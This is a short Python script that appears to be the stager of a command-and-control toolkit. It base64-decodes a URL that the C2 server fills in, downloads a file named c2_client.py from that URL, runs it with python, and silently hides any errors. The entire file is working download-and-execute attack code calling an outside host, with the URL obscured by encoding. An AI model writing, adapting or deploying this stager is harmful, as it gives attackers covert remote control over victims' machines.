import urllib.request as u, subprocess as s, os, base64

# Base64 encoded URL to download the c2_client.py payload
encoded_url = 'insert_base64_url' # Gets amended by c2_server
payload_url = base64.b64decode(encoded_url).decode('utf-8')
payload_filename = 'c2_client.py'

# Download and execute the payload
try:
    u.urlretrieve(payload_url, payload_filename)
    if os.path.isfile(payload_filename):
        s.run(['python', payload_filename])
except Exception:
    pass
